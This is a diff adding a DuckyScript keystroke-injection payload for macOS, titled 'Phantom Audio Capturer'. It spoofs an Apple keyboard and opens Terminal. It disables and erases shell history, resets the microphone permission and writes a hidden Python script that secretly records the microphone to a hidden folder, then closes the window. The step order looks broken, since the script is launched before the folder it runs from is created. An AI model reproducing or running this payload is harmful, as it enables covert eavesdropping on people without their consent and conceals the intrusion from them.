@@ -1,0 +1,61 @@
+REM Creates a hidden folder named .phantom_audio in the home directory.
+REM Writes a Python script (record.py) that uses the sox utility 
+REM to record audio from the microphone and save it as a .mp3 file. 
+
+REM Once executed, the audio recording will start and continue until manually stopped
+REM You can stop the audio recording by finding the PID and using 'kill pid#'  
+REM The recording is saved in the .phantom_audio directory under the home directory
+
+REM To access the audio file easily, you can use the following steps:
+REM Open a new Finder window. Go to the "Go" menu in the menu bar and select "Go to Folder"
+REM enter "~/.phantom_audio" and click the "Go" button.
+REM navigate to the .phantom_audio folder where you can find the "Secret audio.mp3" file.
+
+REM To delete the hidden folder use command 'rm -r ~/.phantom_audio' 
+
+REM Requirements: SOX you can install through homebrew 'brew install sox'
+
+REM Author: Narsty
+REM Title: Phantom Audio Capturer
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Recon
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+STRING  screen -dm bash -c "nohup python3 record.py &"
+DELAY 200
+ENTER
+DELAY 500
+STRING  tccutil reset Microphone com.apple.Terminal
+DELAY 500
+ENTER
+STRING  mkdir -p ~/.phantom_audio && cd ~/.phantom_audio
+DELAY 500
+ENTER
+DELAY 500
+STRING  echo 'import os\nimport subprocess\nimport datetime\n\nfilename = "Secret audio.mp3"\ncmd = f"sox -d -C 128 -r 44100 \"{filename}\""\nsubprocess.Popen(cmd, shell=True)' > record.py
+DELAY 1000
+ENTER
+DELAY 500
+STRING  nohup python3 record.py &
+ENTER
+DELAY 250 
+GUI w
